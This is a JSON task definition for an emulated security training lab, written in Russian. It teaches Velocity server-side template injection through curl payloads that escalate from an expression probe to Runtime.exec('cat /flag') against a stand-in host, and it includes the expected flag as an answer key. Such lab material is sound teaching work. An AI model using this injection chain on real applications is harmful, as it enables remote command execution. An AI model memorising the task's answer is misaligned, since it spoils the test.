@@ -1,0 +1,42 @@
+{
+  "id": "web-expression-other",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{v3l0c1ty_sst1_rce}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Velocity SSTI\n\nGET /page?tpl= подставляет tpl в Velocity-шаблон.\nДойди от выражения до исполнения команды и прочитай флаг.\n\n1. Подтверди движок ($ и # URL-кодируем как %24 и %23):\n   curl -s 'https://app.target/page?tpl=%23set(%24x=7*7)%24x'\n2. Дойди до Runtime:\n   curl -s 'https://app.target/page?tpl=%24class.inspect(%27java.lang.Runtime%27)'\n3. Выполни команду чтения флага:\n   curl -s 'https://app.target/page?tpl=%24class.inspect(%27java.lang.Runtime%27).getRuntime().exec(%27cat%20/flag%27)'\n4. Запиши вывод с флагом в found.txt и набери check.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.target/page)",
+      "cases": [
+        {
+          "match": "inspect|Runtime|exec",
+          "example": "-s '.../page?tpl=%24class.inspect(%27java.lang.Runtime%27).getRuntime().exec(%27cat%20/flag%27)'",
+          "output": "nto{v3l0c1ty_sst1_rce}\n"
+        },
+        {
+          "match": "set\\(%24x|7\\*7",
+          "example": "-s '.../page?tpl=%23set(%24x=7*7)%24x'",
+          "output": "49\n"
+        },
+        {
+          "match": "page",
+          "example": "-s '.../page?tpl=hello'",
+          "output": "hello\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /page на app.target.\n"
+    }
+  }
+}
